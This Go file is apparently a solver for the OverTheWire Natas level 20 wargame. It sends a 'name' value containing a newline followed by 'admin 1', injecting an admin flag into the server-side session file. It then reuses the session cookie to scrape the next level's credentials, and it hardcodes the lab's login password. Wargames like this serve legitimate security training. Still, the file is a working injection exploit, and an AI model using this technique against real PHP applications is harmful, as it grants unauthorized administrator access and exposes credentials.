package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func main() {
	username := "natas20"
	password := "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
	baseUrl := "http://natas20.natas.labs.overthewire.org"
	params := url.Values{}
	params.Set("name", "a\nadmin 1")
	fullUrl := baseUrl + "?" + params.Encode()

	client := &http.Client{}
	request, err := http.NewRequest("POST", fullUrl, nil)
	if err != nil {
		fmt.Printf("%s", err)
	}
	request.Header.Add("Content-Type", "text/html")
	// request.Header.Add("Cookie", "PHPSESSID="+sessid)
	request.SetBasicAuth(username, password)
	response, err := client.Do(request)
	if err != nil {
		fmt.Printf("%s", err)
	}
	body, _ := io.ReadAll(response.Body)
	cookies := response.Cookies()
	// fmt.Printf("%s\n", string(body))

	// for key, value := range cookies {
	// 	fmt.Printf("%d:\t%s\n", key, value.String())
	// }
	request, _ = http.NewRequest("GET", baseUrl, nil)
	request.Header.Add("Content-Type", "text/html")
	request.SetBasicAuth(username, password)
	request.Header.Add("cookie", cookies[0].String())
	response, _ = client.Do(request)
	body, _ = io.ReadAll(response.Body)
	responseString := string(body)
	// fmt.Printf("%s\n", responseString)
	fromSlice := responseString[strings.Index(responseString, "Username: "):]
	nextUser := fromSlice[:strings.Index(fromSlice, "\n")]
	fromSlice = responseString[strings.Index(responseString, "Password: "):]
	nextPassword := fromSlice[:strings.Index(fromSlice, "</pre>")]
	fmt.Printf("%s\n%s\n", nextUser, nextPassword)
}
